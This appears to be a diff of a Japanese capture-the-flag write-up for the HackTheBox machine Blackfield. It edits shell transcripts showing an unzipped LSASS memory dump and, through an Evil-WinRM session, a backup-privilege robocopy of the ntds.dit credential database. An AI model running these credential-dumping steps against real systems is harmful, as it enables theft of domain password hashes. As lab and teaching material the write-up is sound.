@@ -152,7 +152,7 @@ getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1884.9 Ki
 ```
 ┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
 └─$ unzip lsass.zip
-┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192/Lsass]
+┌──(shoebill㉿shoebill)-[~/Blackfield_10.10.10.192]
 └─$ ls             
 lsass.DMP  lsass.zip
 ```
@@ -287,14 +287,8 @@ end backupX
 Eドライブ中のntds.ditをrobocopyしてやる：
 
 ```
-*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\ 
-*Evil-WinRM* PS C:\> mkdir tmp
-*Evil-WinRM* PS C:\> cd tmp
-*Evil-WinRM* PS C:\temp> robocopy /b E:\Windows\ntds . ntds.dit
-*Evil-WinRM* PS C:\temp> ls
-
-
-    Directory: C:\temp
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy /b E:\Windows\ntds . ntds.dit 
+*Evil-WinRM* PS C:\Users\svc_backup\Documents>　ls
 
 
 Mode                LastWriteTime         Length Name
